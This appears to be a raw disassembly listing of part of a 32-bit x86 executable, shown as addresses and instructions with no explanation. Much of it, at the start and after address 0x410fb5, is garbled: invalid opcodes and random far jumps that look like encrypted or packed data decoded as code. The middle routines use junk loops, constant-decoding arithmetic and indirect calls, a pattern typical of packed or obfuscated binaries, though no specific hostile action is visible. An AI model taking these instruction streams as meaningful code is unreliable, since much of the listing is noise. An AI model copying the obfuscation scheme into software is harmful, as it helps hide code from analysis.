  410892:	jmp    DWORD PTR [edx+0x653cdb1d]
  410898:	int    0x15
  41089a:	sub    BYTE PTR [eax],bl
  41089c:	jl     0x410829
  41089e:	sub    dh,dh
  4108a0:	fisub  DWORD PTR [edi+eax*4+0x7b]
  4108a4:	daa    
  4108a5:	or     ebp,DWORD PTR [edi+0x765a12f0]
  4108ab:	fwait
  4108ac:	loopne 0x41082e
  4108ae:	mov    ds:0xf7c58b67,al
  4108b3:	lahf   
  4108b4:	mov    ah,0x8e
  4108b6:	push   ebx
  4108b7:	xlat   BYTE PTR ds:[ebx]
  4108b8:	and    ch,BYTE PTR [esi+esi*2]
  4108bb:	dec    edx
  4108bc:	arpl   bp,si
  4108be:	sub    edi,DWORD PTR [edi+eiz*1]
  4108c1:	sub    al,BYTE PTR [edi-0x49]
  4108c4:	loopne 0x41089b
  4108c6:	pop    ebx
  4108c7:	jne    0x41086d
  4108c9:	push   es
  4108ca:	popa   
  4108cb:	ins    BYTE PTR es:[edi],dx
  4108cc:	dec    edx
  4108cd:	and    eax,0x97e582fc
  4108d2:	and    BYTE PTR [edx-0x25],ah
  4108d5:	rcr    BYTE PTR [ebx-0x2c],cl
  4108d8:	mov    ch,0xad
  4108da:	jle    0x4108d7
  4108dc:	jbe    0x41095b
  4108de:	out    dx,eax
  4108df:	repnz mov ah,0x84
  4108e2:	pop    ds
  4108e3:	mov    ?,ebp
  4108e5:	cmp    DWORD PTR [ecx-0xb23f18],eax
  4108eb:	jmp    0x967d:0x31d2fffa
  4108f2:	or     bh,bl
  4108f4:	js     0x4108a5
  4108f6:	xor    BYTE PTR [eax-0x42],0xb1
  4108fa:	inc    edi
  4108fb:	icebp  
  4108fc:	xchg   edx,eax
  4108fd:	pop    edx
  4108fe:	mov    edx,0xc7d956d9
  410903:	jae    0x410971
  410905:	call   0xa196:0x97045ba2
  41090c:	pusha  
  41090d:	data16 fistp DWORD PTR [eax]
  410910:	in     eax,dx
  410911:	xchg   ebx,eax
  410912:	enter  0x9c6b,0x52
  410916:	aam    0x3e
  410918:	adc    bh,BYTE PTR [ecx-0x23]
  41091b:	sti    
  41091c:	lea    esi,[ebp-0xd]
  41091f:	outs   dx,DWORD PTR ds:[esi]
  410920:	mov    ds:0x60a5510f,al
  410925:	std    
  410926:	cmp    al,dh
  410928:	jnp    0x4108fa
  41092a:	iret   
  41092b:	rcl    DWORD PTR [eax*1+0x76616c0a],1
  410932:	imul   eax,DWORD PTR [ecx],0x4d6fda5b
  410938:	mov    ebp,0xea6d9b72
  41093d:	xchg   edx,eax
  41093e:	push   ss
  41093f:	and    esp,DWORD PTR [esp+edi*1-0x526b7334]
  410946:	popf   
  410947:	pop    ss
  410948:	mov    ecx,0xf6dd8c5b
  41094d:	and    BYTE PTR [esi+0xc],ch
  410950:	(bad)  
  410951:	mov    dl,0xe5
  410953:	fstp   QWORD PTR [ecx]
  410955:	outs   dx,DWORD PTR ds:[esi]
  410956:	sub    bl,cl
  410958:	popa   
  410959:	cmp    dl,cl
  41095b:	push   es
  41095c:	loop   0x41094e
  41095e:	xchg   edi,eax
  41095f:	dec    edi
  410960:	inc    ebx
  410961:	out    dx,al
  410962:	fnstenv [ebx-0x66]
  410965:	xchg   edi,eax
  410966:	sbb    eax,0xd22c9e91
  41096b:	pop    edx
  41096c:	jmp    0x41092f
  41096e:	stc    
  41096f:	inc    esp
  410970:	stos   DWORD PTR es:[edi],eax
  410971:	dec    BYTE PTR [ebp+ebp*2-0x42]
  410975:	call   0x34d5:0x2b30c2b5
  41097c:	mov    edx,0x168b7aaf
  410981:	sub    al,0x4e
  410983:	aam    0x55
  410985:	retf   
  410986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410987:	adc    cl,BYTE PTR [eax+0x420864ce]
  41098d:	add    esi,DWORD PTR [eax]
  41098f:	jl     0x4109c5
  410991:	push   0x63
  410993:	addr16 dec eax
  410995:	dec    edx
  410996:	push   0x2d1ac5b9
  41099b:	idiv   BYTE PTR [esi-0x3ef7ca22]
  4109a1:	jb     0x410a06
  4109a3:	ins    BYTE PTR es:[edi],dx
  4109a4:	dec    esi
  4109a5:	pop    edi
  4109a6:	je     0x41097b
  4109a8:	sbb    BYTE PTR [esi+0x70],ch
  4109ab:	retf   0x1fc5
  4109ae:	iret   
  4109af:	jmp    0x8b9fef1f
  4109b4:	loopne 0x4109c3
  4109b6:	pop    ebp
  4109b7:	push   esi
  4109b8:	cmp    eax,0x7fc1fd6b
  4109bd:	pop    es
  4109be:	push   esi
  4109bf:	out    0xd2,eax
  4109c1:	adc    al,bl
  4109c3:	inc    ecx
  4109c4:	leave  
  4109c5:	ffreep st(2)
  4109c7:	push   cs
  4109c8:	adc    edi,0x71
  4109cb:	inc    ebx
  4109cc:	test   al,0x16
  4109ce:	lods   al,BYTE PTR ds:[esi]
  4109cf:	into   
  4109d0:	sahf   
  4109d1:	pushf  
  4109d2:	adc    eax,0x90063f2b
  4109d7:	and    BYTE PTR [esi+0x3b],0xca
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x526c9d61],0xb5
  410fc4:	jge    0x410ff4
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410f9a
  410fce:	cwde   
  410fcf:	jecxz  0x410fa6
  410fd1:	pop    esp
  410fd2:	addr16 in al,dx
  410fd4:	cli    
  410fd5:	je     0x410fbd
  410fd7:	adc    DWORD PTR [ebx],0x7535df1f
  410fdd:	xor    esp,DWORD PTR [eax]
  410fdf:	adc    ah,BYTE PTR [ebx]
  410fe1:	sbb    eax,0x68c6e45d
  410fe6:	push   0x18
  410fe8:	ja     0x410ff8
  410fea:	jno    0x411067
  410fec:	retf   
  410fed:	sbb    DWORD PTR ds:0x5ad3bdc4,0xac789033
  410ff7:	outs   dx,BYTE PTR ds:[esi]
  410ff8:	sub    ah,BYTE PTR [esp+edi*8+0x428e5f29]
  410fff:	push   esi
  411000:	(bad)  
  411001:	mov    ecx,0x5b60580f
  411006:	jp     0x410fee
  411008:	jmp    0xa301bf48
  41100d:	cdq    
  41100e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41100f:	clc    
  411010:	add    al,0x66
  411012:	pop    ecx
  411013:	shl    BYTE PTR [edi],0x3d
  411016:	add    dl,BYTE PTR [ebx]
  411018:	pop    ecx
  411019:	ja     0x411030
  41101b:	aaa    
  41101c:	leave  
  41101d:	push   es
  41101e:	icebp  
  41101f:	stos   BYTE PTR es:[edi],al
  411020:	fadd   QWORD PTR [eax-0x66]
  411023:	int    0x55
  411025:	push   ecx
  411026:	fucom  st(7)
  411028:	pop    esp
  411029:	inc    edi
  41102a:	mov    eax,ds:0x4c072258
  41102f:	mov    ds:0xeb5ca939,eax
  411034:	pop    es
  411035:	pop    esp
  411036:	sub    dl,bl
  411038:	pop    ss
  411039:	jnp    0x411026
  41103b:	sub    bl,bl
  41103d:	jbe    0x411090
  41103f:	pop    ds
  411040:	retf   0xa40a
  411043:	inc    ebx
  411044:	push   edx
  411045:	mov    ebp,0x77acc5dd
  41104a:	sbb    ecx,DWORD PTR [edi]
  41104c:	enter  0x5d22,0xe7
  411050:	jb     0x411032
  411052:	xchg   edi,eax
  411053:	xchg   esp,eax
  411054:	stc    
  411055:	mov    DWORD PTR [esi],0x155e178b
  41105b:	add    al,0xdb
  41105d:	cmp    bl,dh
  41105f:	(bad)  
  411060:	js     0x411004
  411062:	jbe    0x410ffd
  411064:	or     eax,DWORD PTR [esi-0x2]
  411067:	popa   
  411068:	fcomp  st(1)
  41106a:	jae    0x410ff5
  41106c:	test   DWORD PTR [eax+0x79a39de2],edi
  411072:	inc    edi
  411073:	sbb    DWORD PTR [edx],esp
  411075:	jb     0x41100e
  411077:	or     al,BYTE PTR [eax]
  411079:	pop    ecx
  41107a:	je     0x4110e0
  41107c:	or     al,dh
  41107e:	jmp    0xa1822ca7
  411083:	sbb    al,0xb8
  411085:	ret    
  411086:	(bad)  
  411087:	out    dx,al
  411088:	popa   
  411089:	jae    0x411024
  41108b:	leave  
  41108c:	popf   
  41108d:	inc    esp
  41108e:	push   es
  41108f:	pop    esi
  411090:	mov    ebx,0x6a39dc7a
  411095:	(bad)  
  411096:	cmp    bl,BYTE PTR [esi-0x5236de92]
  41109c:	and    edi,edi
  41109e:	cld    
  41109f:	dec    eax
  4110a0:	cdq    
  4110a1:	jno    0x411048
  4110a3:	adc    al,0x1
  4110a5:	dec    esp
  4110a6:	jg     0x4110d9
  4110a8:	or     al,0x2b
  4110aa:	inc    ebp
  4110ab:	lds    ebp,FWORD PTR ds:0xcfa3de3e
  4110b1:	and    al,al
  4110b3:	test   al,0x50
  4110b5:	dec    esi
  4110b6:	xor    DWORD PTR [ebx+0x3ea279c6],edx
  4110bc:	(bad)  
  4110bd:	and    al,0xd
  4110bf:	lahf   
  4110c0:	or     eax,0xe9898c87
  4110c5:	sub    DWORD PTR [eax+eax*4+0x302834e2],esp
  4110cc:	push   ebp
  4110cd:	xor    bl,BYTE PTR [ebp-0x17edbd2c]
  4110d3:	(bad)  
  4110d4:	cmp    eax,0x9efacb56
  4110d9:	jno    0x41109e
  4110db:	push   cs
  4110dc:	and    bl,BYTE PTR [edx]
  4110de:	push   ebx
  4110df:	sar    edx,1
  4110e1:	cwde   
  4110e2:	adc    al,0xc4
  4110e4:	cmp    ah,BYTE PTR [ebp-0x78]
  4110e7:	jmp    0x4110ee
  4110e9:	pop    ds
  4110ea:	(bad)  
  4110eb:	and    ch,bh
  4110ed:	mov    dh,0xd8
  4110ef:	cmp    BYTE PTR [eax+ecx*1],0x86
  4110f3:	stos   DWORD PTR es:[edi],eax
  4110f4:	cs int3 
  4110f6:	pop    esi
  4110f7:	lods   eax,DWORD PTR ds:[esi]
  4110f8:	mov    esp,0xb667e329
  4110fd:	out    dx,al
  4110fe:	stos   DWORD PTR es:[edi],eax
  4110ff:	sbb    bl,BYTE PTR [edx]
  411101:	xor    ah,dl
  411103:	(bad)  
  411104:	cmc    
  411105:	mul    BYTE PTR [edi+0x4e]
  411108:	icebp  
  411109:	bound  ebx,QWORD PTR [ebx+0x46a83162]
  41110f:	mov    eax,0x4b0cfd81
  411114:	rol    DWORD PTR [edi+0x2c],cl
  411117:	mov    esp,0xa6f86dd8
  41111c:	xlat   BYTE PTR ds:[ebx]
  41111d:	xchg   ebx,eax
  41111e:	or     BYTE PTR [edx+0x4c],al
  411121:	or     BYTE PTR [edx-0x10],ah
  411124:	test   ecx,ecx
  411126:	addr16 popa 
  411128:	dec    ecx
  411129:	pop    ebp
  41112a:	test   DWORD PTR [edx+0x7b],ebp
  41112d:	push   es
  41112e:	pop    edx
  41112f:	(bad)  
  411130:	cmp    al,0x33
  411132:	fist   WORD PTR [eax]
  411134:	ret    0x9e0a
  411137:	sub    eax,0x175cbe07
  41113c:	sbb    eax,0xf20c2ce3
  411141:	jb     0x411159
  411143:	popf   
  411144:	neg    ecx
  411146:	jb     0x4110ff
  411148:	xor    BYTE PTR [eax-0x79d2f075],dl
  41114e:	mov    ds:0x839fd686,eax
  411153:	adc    BYTE PTR [edi-0x4f176530],bl
  411159:	add    BYTE PTR [ebx],0xb1
  41115c:	inc    ecx
  41115d:	pop    edx
  41115e:	push   es
  41115f:	int    0xc4
  411161:	pusha  
  411162:	mov    ebp,0x5ee22bb0
  411167:	ins    BYTE PTR es:[edi],dx
  411168:	addr16 dec esp
  41116a:	pop    ebp
  41116b:	sub    esp,esi
  41116d:	jmp    0x6f2e1bc9
  411172:	cmc    
  411173:	jae    0x41111e
  411175:	fldenv [ebp+0x22]
  411178:	mov    ebx,0xb1197c24
  41117d:	cmp    DWORD PTR [edi+0x343c202c],esi
  411183:	mov    DWORD PTR [eax-0x6d],ecx
  411186:	icebp  
  411187:	(bad)  
  411188:	mov    eax,ds:0xef3c20aa
  41118d:	sahf   
  41118e:	je     0x411162
  411190:	pop    ebp
  411191:	dec    ebx
  411192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411193:	and    dh,dl
  411195:	(bad)  
  411196:	fsub   DWORD PTR [eax]
  411198:	jns    0x4111aa
  41119a:	adc    DWORD PTR [ecx-0x18e43de9],0x32
  4111a1:	mov    bl,0xd1
  4111a3:	call   0x8f505f5c
  4111a8:	fmul   QWORD PTR [esi]
  4111aa:	and    BYTE PTR [edx+0x130164f8],dh
  4111b0:	cli    
  4111b1:	add    ecx,0x9f63ade4
  4111b7:	jbe    0x41121d
  4111b9:	jmp    0x4111e3
  4111bb:	jbe    0x41117d
  4111bd:	stos   DWORD PTR es:[edi],eax
  4111be:	jae    0x4111cf
  4111c0:	inc    edi
  4111c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c2:	cli    
  4111c3:	fisub  DWORD PTR [ecx]
  4111c5:	icebp  
  4111c6:	dec    ebp
  4111c7:	fistp  DWORD PTR [edx]
  4111c9:	dec    ecx
  4111ca:	pop    ecx
  4111cb:	lock psubusw mm7,mm4
  4111cf:	clc    
  4111d0:	dec    esi
  4111d1:	int3   
  4111d2:	push   eax
  4111d3:	cli    
  4111d4:	mov    edi,0x5fb14a69
  4111d9:	xchg   ebx,eax
  4111da:	jp     0x4111dd
  4111dc:	inc    ah
  4111de:	loope  0x4111d7
  4111e0:	dec    eax
  4111e1:	test   eax,0xe96dd1c0
  4111e6:	mov    ecx,0x4ef6712b
  4111eb:	pop    ds
  4111ec:	sbb    DWORD PTR [edx+0x77c61154],ebx
  4111f2:	fiadd  WORD PTR [esi+0x22f35f6b]
  4111f8:	(bad)  
  4111f9:	sti    
  4111fa:	fwait
  4111fb:	call   0x93dd:0x3d8427fb
  411202:	push   0xf4cc908a
  411207:	ror    DWORD PTR [ebx-0x26],1
  41120a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41120b:	jb     0x411231
  41120d:	dec    ebx
  41120f:	fwait
  411210:	cs adc esi,ecx
  411213:	ds pop ebp
  411215:	shr    DWORD PTR [edx-0x21],cl
  411218:	cwde   
  411219:	popf   
  41121a:	inc    eax
  41121b:	out    dx,al
  41121c:	retf   0x9724
  41121f:	bound  edi,QWORD PTR [ebx+0x35]
  411222:	add    BYTE PTR [esi-0x293dea79],0x9c
  411229:	mov    eax,ds:0xc2b209d7
  41122e:	cmp    ecx,DWORD PTR [edi]
  411230:	pop    edx
  411231:	and    DWORD PTR [ebp+ebp*4+0x72a10a44],ebp
  411238:	cmp    ah,BYTE PTR [ecx-0x4a]
  41123b:	popfw  
  41123d:	or     DWORD PTR [ebx-0x8],ebp
  411240:	mov    dh,0xc7
  411242:	or     esi,DWORD PTR [edi+0x5096b51f]
  411248:	jle    0x41121b
